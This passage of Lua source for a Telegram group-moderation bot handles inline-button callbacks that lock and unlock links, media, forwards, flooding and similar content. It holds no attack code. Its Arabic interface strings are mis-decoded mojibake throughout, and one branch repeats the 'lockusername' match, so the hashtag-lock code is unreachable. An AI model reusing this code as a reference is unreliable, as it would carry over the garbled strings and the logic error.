keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/lockusername') and Addictive(data) then
if tonumber(Text:match('(.*)/lockusername')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ '
database:set(bot_id.."Tshake:Lock:User:Name"..Chat_id,"del") 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/lockusername') and Addictive(data) then
if tonumber(Text:match('(.*)/lockusername')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΨͺΨ§Ω '
database:set(bot_id.."Tshake:Lock:hashtak"..Chat_id,"del")  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/locksticar') and Addictive(data) then
if tonumber(Text:match('(.*)/locksticar')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ '
database:set(bot_id.."Tshake:Lock:Sticker"..Chat_id,"del")  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/lockgif') and Addictive(data) then
if tonumber(Text:match('(.*)/lockgif')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΩΨͺΨ­Ψ±ΩΨ§Ψͺ '
database:set(bot_id.."Tshake:Lock:Animation"..Chat_id,"del")  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/lockvideo') and Addictive(data) then
if tonumber(Text:match('(.*)/lockvideo')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΩΩΨ―ΩΩ '
database:set(bot_id.."Tshake:Lock:Video"..Chat_id,"del")  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/lockphoto') and Addictive(data) then
if tonumber(Text:match('(.*)/lockphoto')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΨ΅ΩΨ± '
database:set(bot_id.."Tshake:Lock:Photo"..Chat_id,"del")    
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/lockvoise') and Addictive(data) then
if tonumber(Text:match('(.*)/lockvoise')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΨ§ΨΊΨ§ΩΩ '
database:set(bot_id.."Tshake:Lock:Audio"..Chat_id,"del")  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/lockaudo') and Addictive(data) then
if tonumber(Text:match('(.*)/lockaudo')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΨ΅ΩΨͺ '
database:set(bot_id.."Tshake:Lock:vico"..Chat_id,"del")    
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/lockfwd') and Addictive(data) then
if tonumber(Text:match('(.*)/lockfwd')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΨͺΩΨ¬ΩΩ '
database:set(bot_id.."Tshake:Lock:forward"..Chat_id,'del')  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/lockfile') and Addictive(data) then
if tonumber(Text:match('(.*)/lockfile')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΩΩΩΨ§Ψͺ '
database:set(bot_id.."Tshake:Lock:Document"..Chat_id,"del")  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/lockphone') and Addictive(data) then
if tonumber(Text:match('(.*)/lockphone')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΨ¬ΩΨ§Ψͺ '
database:set(bot_id.."Tshake:Lock:Contact"..Chat_id,"del")  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/lockposts') and Addictive(data) then
if tonumber(Text:match('(.*)/lockposts')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΩΩΨ§ΩΨ΄ '
database:set(bot_id.."Tshake:Lock:Spam"..Chat_id,"del")  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/lockflood') and Addictive(data) then
if tonumber(Text:match('(.*)/lockflood')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ± '
database:hset(bot_id.."Tshake:flooding:settings:"..Chat_id ,"flood","del")  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/lockfarse') and Addictive(data) then
if tonumber(Text:match('(.*)/lockfarse')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ '
database:set(bot_id..'lock:Fars'..Chat_id,true) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/lockfshar') and Addictive(data) then
if tonumber(Text:match('(.*)/lockfshar')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΨ³Ψ¨ '
database:set(bot_id..'lock:Fshar'..Chat_id,true) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/lockinlene') and Addictive(data) then
if tonumber(Text:match('(.*)/lockinlene')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΨ§ΩΩΨ§ΩΩ '
database:set(bot_id.."Tshake:Lock:Inlen"..Chat_id,"del")  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
end
if Text and Text:match('(.*)/unlockjoine') and Addictive(data) then
if tonumber(Text:match('(.*)/unlockjoine')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ§ΨΆΨ§ΩΩ '
database:del(bot_id.."Tshake:Lock:AddMempar"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/unlockchat') and Owner(data) then
if tonumber(Text:match('(.*)/unlockchat')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω '
database:del(bot_id.."Tshake:Lock:text"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/unlock_joine') and Addictive(data) then
if tonumber(Text:match('(.*)/unlock_joine')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ―Ψ?ΩΩ '
database:del(bot_id.."Tshake:Lock:Join"..Chat_id) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/unlockbots') and Addictive(data) then
if tonumber(Text:match('(.*)/unlockbots')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ '
database:del(bot_id.."Tshake:Lock:Bot:kick"..Chat_id)   
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/unlocktags') and Addictive(data) then
if tonumber(Text:match('(.*)/unlocktags')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ '
database:del(bot_id.."Tshake:Lock:tagservr"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/unlockedit') and Owner(data) then
if tonumber(Text:match('(.*)/unlockedit')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨͺΨΉΨ―ΩΩ '
database:del(bot_id.."Tshake:Lock:edit"..Chat_id) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/unlocklink') and Addictive(data) then
if tonumber(Text:match('(.*)/unlocklink')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ· '
database:del(bot_id.."Tshake:Lock:Link"..Chat_id) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/unlockusername') and Addictive(data) then
if tonumber(Text:match('(.*)/unlockusername')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ '
database:del(bot_id.."Tshake:Lock:User:Name"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/unlocktag') and Addictive(data) then
if tonumber(Text:match('(.*)/unlocktag')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨͺΨ§Ω '
database:del(bot_id.."Tshake:Lock:hashtak"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/unlocksticar') and Addictive(data) then
if tonumber(Text:match('(.*)/unlocksticar')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ '
database:del(bot_id.."Tshake:Lock:Sticker"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/unlockgif') and Addictive(data) then
if tonumber(Text:match('(.*)/unlockgif')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΩΨͺΨ­Ψ±ΩΨ§Ψͺ '
database:del(bot_id.."Tshake:Lock:Animation"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/unlockvideo') and Addictive(data) then
if tonumber(Text:match('(.*)/unlockvideo')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΩΩΨ―ΩΩ '
database:del(bot_id.."Tshake:Lock:Video"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/unlockphoto') and Addictive(data) then
if tonumber(Text:match('(.*)/unlockphoto')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ΅ΩΨ± '
database:del(bot_id.."Tshake:Lock:Photo"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/unlockvoise') and Addictive(data) then
if tonumber(Text:match('(.*)/unlockvoise')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ§ΨΊΨ§ΩΩ '
database:del(bot_id.."Tshake:Lock:Audio"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/unlockaudo') and Addictive(data) then
if tonumber(Text:match('(.*)/unlockaudo')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ΅ΩΨͺ '
database:del(bot_id.."Tshake:Lock:vico"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/unlockfwd') and Addictive(data) then
if tonumber(Text:match('(.*)/unlockfwd')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨͺΩΨ¬ΩΩ '
database:del(bot_id.."Tshake:Lock:forward"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/unlockfile') and Addictive(data) then
if tonumber(Text:match('(.*)/unlockfile')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΩΩΩΨ§Ψͺ '
database:del(bot_id.."Tshake:Lock:Document"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/unlockphone') and Addictive(data) then
if tonumber(Text:match('(.*)/unlockphone')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ¬ΩΨ§Ψͺ '
database:del(bot_id.."Tshake:Lock:Contact"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/unlockposts') and Addictive(data) then
if tonumber(Text:match('(.*)/unlockposts')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΩΩΨ§ΩΨ΄ '
database:del(bot_id.."Tshake:Lock:Spam"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/unlockflood') and Addictive(data) then
if tonumber(Text:match('(.*)/unlockflood')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨͺΩΨ±Ψ§Ψ± '
database:hdel(bot_id.."Tshake:flooding:settings:"..Chat_id ,"flood")  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/unlockfarse') and Addictive(data) then
if tonumber(Text:match('(.*)/unlockfarse')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ '
database:del(bot_id..'lock:Fars'..Chat_id) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
